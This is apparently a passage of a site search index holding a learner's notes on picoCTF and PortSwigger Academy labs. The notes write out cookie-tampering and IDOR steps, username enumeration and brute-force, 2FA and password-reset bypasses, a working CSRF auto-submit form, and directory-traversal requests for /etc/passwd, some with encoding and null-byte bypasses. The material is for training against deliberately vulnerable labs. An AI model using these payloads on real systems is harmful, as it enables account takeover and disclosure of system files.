challenge (at least as of 2021), the cookie value was double base64 encoded. I needed to double-decode, bit flip, and then double-encode. With this in place, it \"sovled\" the problem on the 10 th byte in, flipping the 0 th bit. Helpful Writeups: https://docs.abbasmj.com/ctf-writeups/picoctf2021#more-cookies (don't take this verbatim) https://github.com/HHousen/PicoCTF-2021/blob/master/Web%20Exploitation/More%20Cookies/script.py","title":"More Cookies"},{"location":"ctf/pico-webex.html#where-are-the-robots","text":"After the last one that took me quite a long time to solve, this one was nearly a joke. The title suggests that mabye it is a robots.txt problem. Visiting the URL and then adjusting it for robots.txt renders a page that is prohibited ( 1bb4c.html ). If you point your browser there, you will be presented the flag.","title":"where are the robots"},{"location":"ctf/pico-webex.html#logon","text":"This one was, once again, pretty easy. You follow the instructions given and log in as jason (no password). Nothing is obvious other than no flag being shown. If, however, you inspect the cookies, you'll see a parameter that says admin=False . If you alter this to say admin=True and resend the request, you'll be rewarded with the flag to submit.","title":"logon"},{"location":"ctf/pico-webex.html#dont-use-client-side","text":"","title":"dont-use-client-side"},{"location":"ctf/pico-webex.html#it-is-my-birthday","text":"","title":"It is my Birthday"},{"location":"ctf/pico-webex.html#who-are-you","text":"","title":"Who are you?"},{"location":"ctf/pico-webex.html#login","text":"","title":"login"},{"location":"ctf/pico-webex.html#some-assembly-required-2","text":"","title":"Some Assembly Required 2"},{"location":"ctf/pico-webex.html#super-serial","text":"","title":"Super Serial"},{"location":"ctf/pico-webex.html#most-cookies","text":"","title":"Most Cookies"},{"location":"ctf/pico-webex.html#caas","text":"","title":"caas"},{"location":"ctf/pico-webex.html#some-assembly-required-3","text":"","title":"Some Assembly Required 3"},{"location":"ctf/pico-webex.html#web-gauntlet-2","text":"","title":"Web Gauntlet 2"},{"location":"ctf/pico-webex.html#picobrowser","text":"","title":"picobrowser"},{"location":"ctf/pico-webex.html#client-side-again","text":"","title":"Client-side-again"},{"location":"ctf/pico-webex.html#web-gauntlet","text":"","title":"Web Gauntlet"},{"location":"ctf/pico-webex.html#some-assembly-required-4","text":"","title":"Some Assembly Required 4"},{"location":"ctf/pico-webex.html#x-marks-the-spot","text":"","title":"X marks the spot"},{"location":"ctf/pico-webex.html#notepad","text":"","title":"notepad"},{"location":"ctf/pico-webex.html#irish-name-repo-1","text":"","title":"Irish-Name-Repo 1"},{"location":"ctf/pico-webex.html#web-gauntlet-3","text":"","title":"Web Gauntlet 3"},{"location":"ctf/pico-webex.html#jauth","text":"","title":"JAuth"},{"location":"ctf/pico-webex.html#irish-name-repo-2","text":"","title":"Irish-Name-Repo 2"},{"location":"ctf/pico-webex.html#irish-name-repo-3","text":"","title":"Irish-Name-Repo 3"},{"location":"ctf/pico-webex.html#jawt-scratchpad","text":"","title":"JaWT Scratchpad"},{"location":"ctf/pico-webex.html#java-script-kiddie","text":"","title":"Java Script Kiddie"},{"location":"ctf/pico-webex.html#java-script-kiddie-2","text":"","title":"Java Script Kiddie 2"},{"location":"ctf/pico-webex.html#bithug","text":"","title":"Bithug"},{"location":"ctf/picoCTF.html","text":"picoGym \u00b6 Quoting from their website : picoGym is a noncompetitive practice space where you can explore and solve challenges from previously released picoCTF competitions, find fresh never before revealed challenges, and build a knowledge base of cyber security skills in a safe environment. Whether you are a cyber security professional, competitive hacker or new to CTFs you will find interesting challenges in the picoGym that you can solve at your own pace. Team picoCTF will regularly update this challenge repository so visit the picoGym often. I have used this site as a periodic refresher for skills that I need to remain sharp on and as a means of getting my head in the right \"space\". I've also used it as an introductory site for some aspiring cyber professionals. On the pages linked below are my notes/findings/thoughts created while working through the exercises. They are written for my own benefit but they may be of use to others. Note Any time a sample command/output is listed on this page, the actual flag value will be replaced with redacted_value . This is done to ensure the \"keys\" aren't given away entirely should someone find these notes. Current Topics \u00b6 General Skills Web Exploitation Binary Exploitation Cryptography Forensics Reverse Engineering 2019 Competition Future Topics \u00b6 Uncategorized picoMini by redpwn picoCTF 2021 picoCTF 2020 Mini-Competition picoCTF 2019","title":"Overview"},{"location":"ctf/picoCTF.html#picogym","text":"Quoting from their website : picoGym is a noncompetitive practice space where you can explore and solve challenges from previously released picoCTF competitions, find fresh never before revealed challenges, and build a knowledge base of cyber security skills in a safe environment. Whether you are a cyber security professional, competitive hacker or new to CTFs you will find interesting challenges in the picoGym that you can solve at your own pace. Team picoCTF will regularly update this challenge repository so visit the picoGym often. I have used this site as a periodic refresher for skills that I need to remain sharp on and as a means of getting my head in the right \"space\". I've also used it as an introductory site for some aspiring cyber professionals. On the pages linked below are my notes/findings/thoughts created while working through the exercises. They are written for my own benefit but they may be of use to others. Note Any time a sample command/output is listed on this page, the actual flag value will be replaced with redacted_value . This is done to ensure the \"keys\" aren't given away entirely should someone find these notes.","title":"picoGym"},{"location":"ctf/picoCTF.html#current-topics","text":"General Skills Web Exploitation Binary Exploitation Cryptography Forensics Reverse Engineering 2019 Competition","title":"Current Topics"},{"location":"ctf/picoCTF.html#future-topics","text":"Uncategorized picoMini by redpwn picoCTF 2021 picoCTF 2020 Mini-Competition picoCTF 2019","title":"Future Topics"},{"location":"ctf/portswigger.html","text":"PortSwigger Academy \u00b6 PortSwigger Academy ( https://portswigger.net/web-security/dashboard ) is a collection of training materials (reading & videos) combined with hands-on-labs designed to help you learn how to \"secure the web one step at a time\". It covers a number of the most common vulnerabilities, helping you understand them, understand how to exploit them, and how they can be prevented. Best of all, they are all free. The tools are designed to work with/be supported by PortSwigger's flagship product, Burp Suite Professional, but you can utilize any number of other tools (curl/browsers/ZAP/etc). At the time I worked through these, I did not have access to a professional license, so I used the Burp Suite Community edition (free). Below are my notes written as I worked through the various challenges. Topics \u00b6 Access Control Authentication Cross-Site Scripting OS Command Injection SQL Injection Cross-Site Request Forgery Directory Traversal HTTP Host Header Attacks Future Topics \u00b6 Clickjacking DOM-based Vulnerabilities Cross-Origin Resource Sharing (CORS) XML External Entity (XXE) injection Server-Side Request Forgery (SSRF) HTTP Request Smuggling Server-Side Template Injection WebSockets Web Cache Poisoning Insecure Deserialization Information Disclosure Business Logic Vulnerabilities OAuth Authentication","title":"Overview"},{"location":"ctf/portswigger.html#portswigger-academy","text":"PortSwigger Academy ( https://portswigger.net/web-security/dashboard ) is a collection of training materials (reading & videos) combined with hands-on-labs designed to help you learn how to \"secure the web one step at a time\". It covers a number of the most common vulnerabilities, helping you understand them, understand how to exploit them, and how they can be prevented. Best of all, they are all free. The tools are designed to work with/be supported by PortSwigger's flagship product, Burp Suite Professional, but you can utilize any number of other tools (curl/browsers/ZAP/etc). At the time I worked through these, I did not have access to a professional license, so I used the Burp Suite Community edition (free). Below are my notes written as I worked through the various challenges.","title":"PortSwigger Academy"},{"location":"ctf/portswigger.html#topics","text":"Access Control Authentication Cross-Site Scripting OS Command Injection SQL Injection Cross-Site Request Forgery Directory Traversal HTTP Host Header Attacks","title":"Topics"},{"location":"ctf/portswigger.html#future-topics","text":"Clickjacking DOM-based Vulnerabilities Cross-Origin Resource Sharing (CORS) XML External Entity (XXE) injection Server-Side Request Forgery (SSRF) HTTP Request Smuggling Server-Side Template Injection WebSockets Web Cache Poisoning Insecure Deserialization Information Disclosure Business Logic Vulnerabilities OAuth Authentication","title":"Future Topics"},{"location":"ctf/ps-accesscontrol.html","text":"Access Control Vulnerabilities \u00b6 Unprotected admin functionality \u00b6 Question This lab has an unprotected admin panel. Solve the lab by deleting the user carlos . This was pretty simple, though it took me a bit to remember that /robots.txt can be your friend when looking for \"hidden\" directory paths. Once I remembered this, I navigated to /administrator-panel (which was unprotected) and successfully deleted the user. Unprotected admin functionality with unpredictable URL \u00b6 Question This lab has an unprotected admin panel. It's located at an unpredictable location, but the location is disclosed somewhere in the application. Solve the lab by accessing the admin panel, and using it to delete the user carlos . The normal guesses didn't work, so I started looking through the raw HTML within burpsuite. Eventually, I stumbled across this bit of JavaScript: var isAdmin = false ; if ( isAdmin ) { var topLinksTag = document . getElementsByClassName ( \"top-links\" )[ 0 ]; var adminPanelTag = document . createElement ( 'a' ); adminPanelTag . setAttribute ( 'href' , '/admin-gw0pr8' ); adminPanelTag . innerText = 'Admin panel' ; topLinksTag . append ( adminPanelTag ); var pTag = document . createElement ( 'p' ); pTag . innerText = '|' ; topLinksTag . appendChild ( pTag ); } This made it clear that simply going to /admin-gw0pr8 was the key and I was able to delete the user. User role controlled by request parameter \u00b6 Question This lab has an admin panel at /admin , which identifies administrators using a forgeable cookie. Solve the lab by accessing the admin panel and using it to delete the user carlos . You can log in to your own account using the following credentials: wiener:peter I first visited the site and logged in with \"my\" credentials and then attempted to visit the /admin page. After receiving an error, I looked at the response data in burpsuite. I immediately saw a cookie that looked like the following: Cookie: Admin=false; session=D8CRqtEqMaPm0lhHMAVEcW452XcJq0Cd . I sent the request to the \"Repeater\" tool and edited the cookie to say Admin=true; . I then used the \"request in browser/original session\" tool, and the page rendered properly and I deleted the user. UPDATE Actually, the above didn't solve it. I did successfully get to the admin page, but the request to delete the user was denied because the cookie had been re-written. I probaby could have solved this via a re-write rule, but ended up just editing the GET request to /admin/delete?username=carlos and submitting it via the repeater tool. User role can be modified in user profile \u00b6 Question This lab has an admin panel at /admin . It's only accessible to logged-in users with a roleid of 2 . Solve the lab by accessing the admin panel and using it to delete the user carlos . You can log in to your own account using the following credentials: wiener:peter I logged in, visited the /admin page and received the \"access denied\" error. Went back to the profile page, updated the account email and noticed that the roleid param is shown in the response to the /my-account/change-email request. I sent this request to the Repeater tool and added my own roleid param in the post and re-sent. As expected, it was processed and accepted fine. I was then able to visit /admin and delete carlos . User ID controlled by request parameter \u00b6 Question This lab has a horizontal privilege escalation vulnerability on the user account page. To solve the lab, obtain the API key for the user carlos and submit it as the solution. You can log in to your own account using the following credentials: wiener:peter I logged in to the application and on the /my-account page, my API key was shown. I noodled around a bit and failed to see anything like what I expected. Eventually, I navigated back to the home page, and then returned to the /my-account page. This time, however, I noticed the URL was a little different... /my-account?id=wiener . Of course, the solution looks obvious. I changed it to /my-account?id=carlos and was presented with that account's page/key. I submitted that answer and solved the challenge. User ID controlled by request parameter, with unpredictable user IDs \u00b6 Question This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs. To solve the lab, find the GUID for carlos, then submit his API key as the solution. You can log in to your own account using the following credentials: wiener:peter The key to this challenge is actually reading the entire block of instructions in the training material. Here it is suggested that user ids may be disclosed in other parts of the application (this I was guessing), such as user reviews and comments (I hadn't thought about this). I noodled around a little and found a post written by carlos. This page contained the following HTML: < span id = blog-author >< a href = '/blogs?userId=091f297d-6894-4e29-97a6-21647b180a44' > carlos </ a ></ span > From here, the solution was easy.","title":"Access Control"},{"location":"ctf/ps-accesscontrol.html#access-control-vulnerabilities","text":"","title":"Access Control Vulnerabilities"},{"location":"ctf/ps-accesscontrol.html#unprotected-admin-functionality","text":"Question This lab has an unprotected admin panel. Solve the lab by deleting the user carlos . This was pretty simple, though it took me a bit to remember that /robots.txt can be your friend when looking for \"hidden\" directory paths. Once I remembered this, I navigated to /administrator-panel (which was unprotected) and successfully deleted the user.","title":" Unprotected admin functionality"},{"location":"ctf/ps-accesscontrol.html#unprotected-admin-functionality-with-unpredictable-url","text":"Question This lab has an unprotected admin panel. It's located at an unpredictable location, but the location is disclosed somewhere in the application. Solve the lab by accessing the admin panel, and using it to delete the user carlos . The normal guesses didn't work, so I started looking through the raw HTML within burpsuite. Eventually, I stumbled across this bit of JavaScript: var isAdmin = false ; if ( isAdmin ) { var topLinksTag = document . getElementsByClassName ( \"top-links\" )[ 0 ]; var adminPanelTag = document . createElement ( 'a' ); adminPanelTag . setAttribute ( 'href' , '/admin-gw0pr8' ); adminPanelTag . innerText = 'Admin panel' ; topLinksTag . append ( adminPanelTag ); var pTag = document . createElement ( 'p' ); pTag . innerText = '|' ; topLinksTag . appendChild ( pTag ); } This made it clear that simply going to /admin-gw0pr8 was the key and I was able to delete the user.","title":" Unprotected admin functionality with unpredictable URL"},{"location":"ctf/ps-accesscontrol.html#user-role-controlled-by-request-parameter","text":"Question This lab has an admin panel at /admin , which identifies administrators using a forgeable cookie. Solve the lab by accessing the admin panel and using it to delete the user carlos . You can log in to your own account using the following credentials: wiener:peter I first visited the site and logged in with \"my\" credentials and then attempted to visit the /admin page. After receiving an error, I looked at the response data in burpsuite. I immediately saw a cookie that looked like the following: Cookie: Admin=false; session=D8CRqtEqMaPm0lhHMAVEcW452XcJq0Cd . I sent the request to the \"Repeater\" tool and edited the cookie to say Admin=true; . I then used the \"request in browser/original session\" tool, and the page rendered properly and I deleted the user. UPDATE Actually, the above didn't solve it. I did successfully get to the admin page, but the request to delete the user was denied because the cookie had been re-written. I probaby could have solved this via a re-write rule, but ended up just editing the GET request to /admin/delete?username=carlos and submitting it via the repeater tool.","title":" User role controlled by request parameter"},{"location":"ctf/ps-accesscontrol.html#user-role-can-be-modified-in-user-profile","text":"Question This lab has an admin panel at /admin . It's only accessible to logged-in users with a roleid of 2 . Solve the lab by accessing the admin panel and using it to delete the user carlos . You can log in to your own account using the following credentials: wiener:peter I logged in, visited the /admin page and received the \"access denied\" error. Went back to the profile page, updated the account email and noticed that the roleid param is shown in the response to the /my-account/change-email request. I sent this request to the Repeater tool and added my own roleid param in the post and re-sent. As expected, it was processed and accepted fine. I was then able to visit /admin and delete carlos .","title":" User role can be modified in user profile"},{"location":"ctf/ps-accesscontrol.html#user-id-controlled-by-request-parameter","text":"Question This lab has a horizontal privilege escalation vulnerability on the user account page. To solve the lab, obtain the API key for the user carlos and submit it as the solution. You can log in to your own account using the following credentials: wiener:peter I logged in to the application and on the /my-account page, my API key was shown. I noodled around a bit and failed to see anything like what I expected. Eventually, I navigated back to the home page, and then returned to the /my-account page. This time, however, I noticed the URL was a little different... /my-account?id=wiener . Of course, the solution looks obvious. I changed it to /my-account?id=carlos and was presented with that account's page/key. I submitted that answer and solved the challenge.","title":" User ID controlled by request parameter"},{"location":"ctf/ps-accesscontrol.html#user-id-controlled-by-request-parameter-with-unpredictable-user-ids","text":"Question This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs. To solve the lab, find the GUID for carlos, then submit his API key as the solution. You can log in to your own account using the following credentials: wiener:peter The key to this challenge is actually reading the entire block of instructions in the training material. Here it is suggested that user ids may be disclosed in other parts of the application (this I was guessing), such as user reviews and comments (I hadn't thought about this). I noodled around a little and found a post written by carlos. This page contained the following HTML: < span id = blog-author >< a href = '/blogs?userId=091f297d-6894-4e29-97a6-21647b180a44' > carlos </ a ></ span > From here, the solution was easy.","title":" User ID controlled by request parameter, with unpredictable user IDs"},{"location":"ctf/ps-auth.html","text":"Authentication \u00b6 Username enumeration via different responses \u00b6 Question This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists: Candidate usernames Candidate passwords To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page. Goal: Enumerate a valid username, brute-force the user's password, and then access the user's account page. You are provided a wordlist of candidate usernames as well as a list of candidate passwords. Here are the steps I took to solve this challenge: Load up Burp and start the embedded browser Connect to the URL provided and visit the /login page Attempt to log in with a random username/password View the POST request in Burp and send it to the intruder On the Positions tab, I cleared the \u00a7 from the session cookie, leaving just the username and password positions Pasted the values from the list of candidate usernames (100 of them) into the Payload Options (simple list) and started the attack, paying attention to the response payload size. After the list ran through, I sorted by response length and noticed that one of them (username: agenda ) had a different payload length. Looking at the response text, I noticed that it said \"Incorrect password\" . Returning to the positions page, I changed the username to a static value of agenda I cleared the payload list and pasted in the values from the candidate password list and then ran the attack Watching the response lengths, I again noticed taht one of them (password: robert ) had a different length. Inspecting the response showed that user had logged in. With this information, I then returned to the browser, manually logged in with this information, and completed the challenge Username enumeration via subtly different responses \u00b6 Question This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists: Candidate usernames Candidate passwords To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page. Working on this challenge made me sharpen my understanding of the intruder tool. I had two lists, and I wanted to run all permutations of them (combined). The mistake I had been making was that I had been failing to change the attack type from the default Sniper to the Cluster Bomb option. This let me define my two lists, each assigned to one of the two fields/positions, and then start. After just over 10,000 attempts, we found one request that returned a 302 rather than a 200 . Logging in as at with a password of 7777777 solved the challenge. Username enumeration via response timing \u00b6 Question This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page. Your credentials: wiener:peter Candidate usernames Candidate passwords This was an unwelcome response: Error You have made too many incorrect login attempts. Please try again in 30 minute(s). The more accurate statement... I should have read the instructions. You are supposed to do this in two steps: 1. enumerate the username and then 2. brute force that user's password. I tried to just do the cluster bomb approach and that was foolish. 2FA simple bypass \u00b6 Question This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page. Your credentials: wiener:peter Victim's credentials carlos:montoya Given a valid username/password and access to that account's email, as well as a victim username/password, you are asked to bypass the 2FA for the victim's account (you do not have access to their email) and get to their profile page. Walking through the auth flow with a valid user is pretty straight foward. You log in at /login and then are directed to /login2 to enter the 2FA code. Once you get that from your email, you are redirected to /my-account . The \"attack\" is as simple as completing the first stage with the victim's credentials and then changing the URL to /my-account . This succeeds as there is no session logic to confirm that the 2FA code was entered (only redirection logic). Password reset broken logic \u00b6 Question This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his \"My account\" page. Your credentials: wiener:peter Victim's username: carlos Given a valid set of credentials as well as a victim username, you are asked to reset the victim's password and then log in to view the \"my account\" page. Using the valid credentials, I pretended to have forgotton my password and requested a password reset link. I then completed that process and reviewed the POST request to /forgot-password . I noticed the payload had not only the reset token and the new password, but also the username. I sent the request to the repeater, changed the username to the victim username and re-submitted it. The request completed, so I went to the browser, logged in with the victim username and my newly-set password and was able to view the account page.","title":"Authentication"},{"location":"ctf/ps-auth.html#authentication","text":"","title":"Authentication"},{"location":"ctf/ps-auth.html#username-enumeration-via-different-responses","text":"Question This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists: Candidate usernames Candidate passwords To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page. Goal: Enumerate a valid username, brute-force the user's password, and then access the user's account page. You are provided a wordlist of candidate usernames as well as a list of candidate passwords. Here are the steps I took to solve this challenge: Load up Burp and start the embedded browser Connect to the URL provided and visit the /login page Attempt to log in with a random username/password View the POST request in Burp and send it to the intruder On the Positions tab, I cleared the \u00a7 from the session cookie, leaving just the username and password positions Pasted the values from the list of candidate usernames (100 of them) into the Payload Options (simple list) and started the attack, paying attention to the response payload size. After the list ran through, I sorted by response length and noticed that one of them (username: agenda ) had a different payload length. Looking at the response text, I noticed that it said \"Incorrect password\" . Returning to the positions page, I changed the username to a static value of agenda I cleared the payload list and pasted in the values from the candidate password list and then ran the attack Watching the response lengths, I again noticed taht one of them (password: robert ) had a different length. Inspecting the response showed that user had logged in. With this information, I then returned to the browser, manually logged in with this information, and completed the challenge","title":" Username enumeration via different responses"},{"location":"ctf/ps-auth.html#username-enumeration-via-subtly-different-responses","text":"Question This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists: Candidate usernames Candidate passwords To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page. Working on this challenge made me sharpen my understanding of the intruder tool. I had two lists, and I wanted to run all permutations of them (combined). The mistake I had been making was that I had been failing to change the attack type from the default Sniper to the Cluster Bomb option. This let me define my two lists, each assigned to one of the two fields/positions, and then start. After just over 10,000 attempts, we found one request that returned a 302 rather than a 200 . Logging in as at with a password of 7777777 solved the challenge.","title":" Username enumeration via subtly different responses"},{"location":"ctf/ps-auth.html#username-enumeration-via-response-timing","text":"Question This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page. Your credentials: wiener:peter Candidate usernames Candidate passwords This was an unwelcome response: Error You have made too many incorrect login attempts. Please try again in 30 minute(s). The more accurate statement... I should have read the instructions. You are supposed to do this in two steps: 1. enumerate the username and then 2. brute force that user's password. I tried to just do the cluster bomb approach and that was foolish.","title":" Username enumeration via response timing"},{"location":"ctf/ps-auth.html#2fa-simple-bypass","text":"Question This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page. Your credentials: wiener:peter Victim's credentials carlos:montoya Given a valid username/password and access to that account's email, as well as a victim username/password, you are asked to bypass the 2FA for the victim's account (you do not have access to their email) and get to their profile page. Walking through the auth flow with a valid user is pretty straight foward. You log in at /login and then are directed to /login2 to enter the 2FA code. Once you get that from your email, you are redirected to /my-account . The \"attack\" is as simple as completing the first stage with the victim's credentials and then changing the URL to /my-account . This succeeds as there is no session logic to confirm that the 2FA code was entered (only redirection logic).","title":" 2FA simple bypass"},{"location":"ctf/ps-auth.html#password-reset-broken-logic","text":"Question This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his \"My account\" page. Your credentials: wiener:peter Victim's username: carlos Given a valid set of credentials as well as a victim username, you are asked to reset the victim's password and then log in to view the \"my account\" page. Using the valid credentials, I pretended to have forgotton my password and requested a password reset link. I then completed that process and reviewed the POST request to /forgot-password . I noticed the payload had not only the reset token and the new password, but also the username. I sent the request to the repeater, changed the username to the victim username and re-submitted it. The request completed, so I went to the browser, logged in with the victim username and my newly-set password and was able to view the account page.","title":" Password reset broken logic"},{"location":"ctf/ps-csrf.html","text":"Cross-site Request Forgery (CSRF) \u00b6 CSRF vulnerability with no defenses \u00b6 Question This lab's email change functionality is vulnerable to CSRF. To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server. You can log in to your own account using the following credentials: wiener:peter This first one was easy... following the instructions in the documentation on CSRF, you simply craft an evil payload something similar to the following: < html > < body > < form action = \"https://acbd1fc91ebd63dfc0dc1e3100420089.web-security-academy.net/my-account/change-email\" method = \"POST\" > < input type = \"hidden\" name = \"email\" value = \"pwned@evil-user.net\" /> </ form > < script > document . forms [ 0 ]. submit (); </ script > </ body > </ html >","title":"Cross-Site Request Forgery"},{"location":"ctf/ps-csrf.html#cross-site-request-forgery-csrf","text":"","title":"Cross-site Request Forgery (CSRF)"},{"location":"ctf/ps-csrf.html#csrf-vulnerability-with-no-defenses","text":"Question This lab's email change functionality is vulnerable to CSRF. To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server. You can log in to your own account using the following credentials: wiener:peter This first one was easy... following the instructions in the documentation on CSRF, you simply craft an evil payload something similar to the following: < html > < body > < form action = \"https://acbd1fc91ebd63dfc0dc1e3100420089.web-security-academy.net/my-account/change-email\" method = \"POST\" > < input type = \"hidden\" name = \"email\" value = \"pwned@evil-user.net\" /> </ form > < script > document . forms [ 0 ]. submit (); </ script > </ body > </ html >","title":"CSRF vulnerability with no defenses"},{"location":"ctf/ps-dirtrav.html","text":"Directory Traversal \u00b6 File path traversal, simple case \u00b6 Question This lab contains a file path traversal vulnerability in the display of product images. To solve the lab, retrieve the contents of the /etc/passwd file. Tip I tried to solve this using just a browser, but was unsuccessful. Primarily because the content type of the return is image/jpeg and since I'm pulling text (the /etc/passwd file), it simply doesn't render properly in the chrome developer tools. NTS: use the tool. Poking around a bit and found that the site dynamically loads images using the following structure: https://ac101fa61fd2a9cdc02e17a800950081.web-security-academy.net/image?filename=37.jpg I simply found this request in the Burp Suite proxy, forwarded it to the repeater tool and edited the filename parameter to be image?filename=../../../etc/passwd and then sent the request. The response looked like the following: HTTP/1.1 200 OK Content-Type: image/jpeg Connection: close Content-Length: 1260 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin peter:x:12001:12001::/home/peter:/bin/bash carlos:x:12002:12002::/home/carlos:/bin/bash user:x:12000:12000::/home/user:/bin/bash elmer:x:12099:12099::/home/elmer:/bin/bash academy:x:10000:10000::/home/academy:/bin/bash dnsmasq:x:101:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin messagebus:x:102:101::/nonexistent:/usr/sbin/nologin File path traversal, traversal sequences blocked with absolute path bypass \u00b6 Question This lab contains a file path traversal vulnerability in the display of product images. The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory. To solve the lab, retrieve the contents of the /etc/passwd file. This one was pretty easy. Given a request like the following: GET /image?filename=48.jpg HTTP/1.1 I confirmed that it didn't work the \"easy way\" by testing this: GET /image?filename=../../../etc/passwd HTTP/1.1 And received an error indicating the requested file did not exist. So, following the instructions, I adjusted the request as follows: GET /image?filename=/etc/passwd HTTP/1.1 And was rewarded with the contents of the /etc/passwd file. File path traversal, traversal sequences stripped non-recursively \u00b6 Question This lab contains a file path traversal vulnerability in the display of product images. The application strips path traversal sequences from the user-supplied filename before using it. To solve the lab, retrieve the contents of the /etc/passwd file. The key to solving this lab is that the server-side code appears to be looking for instances of ../ and stripping them, but non-recursively . This means, that they might have a line that looks like the following bit of python: safe_path = requested_path . replace ( \"../\" , \"\" ) If you provide a request that looks like this: /image?filename=....//....//....//etc/passwd , the value of safe_path still has a traversal problem, which means we will still get the file we are looking for which, is in fact, the case here. File path traversal, traversal sequences stripped with superfluous URL-decode \u00b6 Question This lab contains a file path traversal vulnerability in the display of product images. The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it. To solve the lab, retrieve the contents of the /etc/passwd file. On this one, I tried URL-encoding the traversal attack as follows: GET /image?filename=%2E%2E%2f%2E%2E%2f%2E%2E%2fetc%2fpasswd HTTP/1.1 You see that each . becomes %2e and each / becomes %2f . But this didn't work. I then tried double URL encoding the path as shown below, which did work. GET /image?filename=%252E%252E%252f%252E%252E%252f%252E%252E%252fetc%252fpasswd HTTP/1.1 The problem or bug in this application is that they called a \"safe\" function (URL-decode) twice... once prior to checking for path traversal issues (a good thing) but a second time after checking for path traversal issues. This could almost be considered a TOCTOU type bug. File path traversal, validation of start of path \u00b6 Question This lab contains a file path traversal vulnerability in the display of product images. The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder. To solve the lab, retrieve the contents of the /etc/passwd file. Within the HTTP request log, I found a request that looks like this: GET /image?filename=/var/www/images/47.jpg HTTP/1.1 I modified it as follows: GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1 After submission, I was presented the /etc/passwd file. File path traversal, validation of file extension with null byte bypass \u00b6 Question This lab contains a file path traversal vulnerability in the display of product images. The application validates that the supplied filename ends with the expected file extension. To solve the lab, retrieve the contents of the /etc/passwd file. If you take the time to read the documentation on this type of issue, the solution becomes quite straight forward. The following GET request does the trick: GET /image?filename=../../../etc/passwd%00.jpg HTTP/1.1","title":"Directory Traversal"},{"location":"ctf/ps-dirtrav.html#directory-traversal","text":"","title":"Directory Traversal"},{"location":"ctf/ps-dirtrav.html#file-path-traversal-simple-case","text":"Question This lab contains a file path traversal vulnerability in the display of product images. To solve the lab, retrieve the contents of the /etc/passwd file. Tip I tried to solve this using just a browser, but was unsuccessful. Primarily because the content type of the return is image/jpeg and since I'm pulling text (the /etc/passwd file), it simply doesn't render properly in the chrome developer tools. NTS: use the tool. Poking around a bit and found that the site dynamically loads images using the following structure: https://ac101fa61fd2a9cdc02e17a800950081.web-security-academy.net/image?filename=37.jpg I simply found this request in the Burp Suite proxy, forwarded it to the repeater tool and edited the filename parameter to be image?filename=../../../etc/passwd and then sent the request. The response looked like the following: HTTP/1.1 200 OK Content-Type: image/jpeg Connection: close Content-Length: 1260 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin peter:x:12001:12001::/home/peter:/bin/bash carlos:x:12002:12002::/home/carlos:/bin/bash user:x:12000:12000::/home/user:/bin/bash 